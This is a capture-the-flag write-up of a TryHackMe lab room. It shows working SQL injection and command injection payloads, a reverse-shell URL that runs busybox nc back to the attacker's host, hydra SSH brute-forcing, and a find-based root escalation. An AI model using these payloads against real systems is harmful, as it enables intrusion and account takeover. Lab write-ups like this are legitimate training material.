# Operation Promotion CTF | TryHackMe | Muhammad Zaid

![image](https://github.com/user-attachments/assets/9377f6f0-2786-44b7-9292-ed8162029434)

&#x20;lab url = https://tryhackme.com/room/operationpromotion

| Platform                                      | Category      | Difficulty |
| --------------------------------------------- | ------------- | ---------- |
| [tryhackme.com](https://tabletomarkdown.com/) | Web and Linux | Medium     |

**Story** : You are up for promotion at Hadron Security. Your senior lead, Mara, has handed you a solo engagement against RecruitCorp, a small recruiting firm with a public-facing portal. Compromise the host, capture the flags, and demonstrate that you are ready for the Penetration Tester tit

### Objective

* user flag
* root flag

### Prerequisites

* Scanning & Enumeration
* web fundamentals
* networking
* reverse shell generation
* exploitation
* SQLi
* Command Injection
* Priv Esc
* CLI

### Tools we will use

* Nmap
* penelope
* ssh
* common sence
* manual testing

### Attack Chain

```
Nmap Scan
   ↓
Web Enumeration
   ↓
robots.txt Discovery
   ↓
Admin Panel Discovery
   ↓
SQL Injection (SQLi)
   ↓
Command Injection
   ↓
Reverse Shell
   ↓
Weak Password Discovery
   ↓
SSH Brute Force
   ↓
jford User Access
   ↓
SUID Enumeration
   ↓
/usr/bin/find Exploitation
   ↓
Privilege Escalation
   ↓
Root Access
```

## Phase 1 Scanning with Nmap

before rushing into the target and exploiting it we need to identify what it is running like which service OS open ports to determine this we use nmap

```bash
nmap -A -T4 <IP> -vv -oN sca.txt
```

nmap output

```bash
# Nmap 7.991 scan initiated Sat Nov  7 21:50:23 2026 as: /usr/lib/nmap/nmap --privileged -A -T4 -vv -oN scan.txt 10.112.131.183
Nmap scan report for 10.112.131.183
Host is up, received reset ttl 62 (0.21s latency).
Scanned at 2026-11-07 21:50:24 PKT for 47s
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 62 OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 88:ec:6c:8f:b8:d7:e5:a8:da:42:e4:af:04:cd:aa:a4 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAd2CH4C9JVis0D6Bytwz6gMh/wKM66vbeA12bFhWkjfa9iN4LawEDc6jTHlzzS4WGoBbUzbBWjKGmSXc8SV4LU=
|   256 77:1f:5e:c0:ea:85:39:df:56:02:45:69:46:bd:8d:d3 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMolDiU/X8hV99N5H7byKKov6UFSZ15ckcuSNjHkZfmY
80/tcp  open  http        syn-ack ttl 62 Apache httpd 2.4.58 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: RecruitCorp - Careers Portal
| http-robots.txt: 1 disallowed entry 
|_/admin/
|_http-server-header: Apache/2.4.58 (Ubuntu)
139/tcp open  netbios-ssn syn-ack ttl 62 Samba smbd 4
445/tcp open  netbios-ssn syn-ack ttl 62 Samba smbd 4
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.991%E=4%D=11/7%OT=22%CT=1%CU=41583%PV=Y%DS=3%DC=T%G=Y%TM=6AEF56
OS:FF%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=102%TI=Z%CI=Z%TS=A)SEQ(SP=
OS:103%GCD=1%ISR=10A%TI=Z%CI=Z%TS=A)SEQ(SP=103%GCD=1%ISR=10B%TI=Z%CI=Z%II=I
OS:%TS=A)SEQ(SP=103%GCD=1%ISR=10E%TI=Z%CI=Z%TS=A)SEQ(SP=FE%GCD=1%ISR=10F%TI
OS:=Z%CI=Z%TS=A)OPS(O1=M4E8ST11NW8%O2=M4E8ST11NW8%O3=M4E8NNT11NW8%O4=M4E8ST
OS:11NW8%O5=M4E8ST11NW8%O6=M4E8ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=
OS:F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M4E8NNSNW8%CC=Y%Q=)T1(R=Y%DF=Y%T
OS:=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=
OS:40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0
OS:%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R
OS:=N)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 43.491 days (since Fri Sep 25 10:04:10 2026)
Network Distance: 3 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

the 22 80 139 and 445 are open i have tried the 445 but i didn't find anything there. if you want you can explore it. lets move to port 80

## Web Enumeration

![image](https://github.com/user-attachments/assets/65e70a65-4d83-483d-a059-f0da5d801c4f)

&#x20;there was static page i tried to enumerate some info there but there was not then i decided to check the \`/robots.txt\` file and there was a endpoint \`/admin\` i navigated to that when that page opened i saw a login page. there i tried to enter a basic SQLi Payload and that worked means that there was a SQLi Vulnerability the payload was \`' OR 1=1--\` the \`'\` quote break the SQl Query and the \`OR\` is a bolean operator that will execute if one condition is true in our case \`1=1\` is a true value then last \`--\` is a comment is SQL fix the query. when logged in a web application we get the user id lookup table where we enter a user id it tells about it i was entering the ids from 1 and when i reached to id 7 i saw a endpoint on the lookup table.&#x20;

![image](https://github.com/user-attachments/assets/37cba684-1d76-4181-a466-5785b1a90b05)

&#x20;and when navigated to that path there was a usage guide \`/admin/sysmaint-check/ping.php?host=\`. there is a parameter we can try command injection 💉 in that field first i tried the \`id\` command it says could not resolved then i figure out we cannot run the direct command then i tried this

### Initial Access (Rev Shell)

first i started a listner on my machine i used penelope for my rev shell you can install it from here https://github.com/brightio/penelope

```bash
penelope -p 8888
```

`http://10.112.131.183/admin/sysmaint-checks/ping.php?host=127.0.0.1$(busybox nc 192.168.135.32 8888 -e bash)` and when i execute this url i got the rev shell on my listner&#x20;

and now we have a shell on the target machine on the `/var/www/html/config/db.conf` i found some information about the user jford there was his hash but unfortunately we couldn't able to crack it.  when again i navigated to the `http://IP` and saw there was the heading `spring 2026` We generate a wordlist from the base spring2026. For brute-force attacks, we use Hashcat with the dive rule. This generates nearly 100,000 possible passwords.

```bash
echo "spring2026" > base.txt
```

```bash
hashcat --stdout base.txt -r /usr/share/hashcat/rules/dive.rule > wordlist.txt
```

We use Hydra to launch a dictionary attack on the SSH services as jford and select our newly generated wordlist. After a short while, we get a match.

```bash
hydra -l jford -P wordlist.txt  ssh://IP
```

![image](https://github.com/user-attachments/assets/3c54852c-baef-4f03-a192-b2c78be1c98c)

&#x20;then i connected to the ssh service \`\`\`bash ssh jford@IP \`\`\`&#x20;

![image](https://github.com/user-attachments/assets/900b82e9-31f4-4bcd-897a-0fa3ae8a975a)

then type `ls` and then `cat user.txt`&#x20;

## Privilege Escalation

now we are normal user on the target machine now we have to escalate it from normal user to root user. the first command anyone run for priv esc is

```bash
sudo -l
```

this command list down the SUID binaries  and we got the `/usr/bin/find` SUID binary can be exeucted as root. the best resource to escalate priv esc is https://gtfobins.org/gtfobins/find/ there i found the exploit for priv esc

```bash
sudo /usr/bin/find . -exec /bin/sh \; -quit
```

![image](https://github.com/user-attachments/assets/b87aa7b7-d4bc-4951-a728-2f782a7e55d4)

and now we are root and get the roof flag

```bash
cd /root
cat flag.txt
```
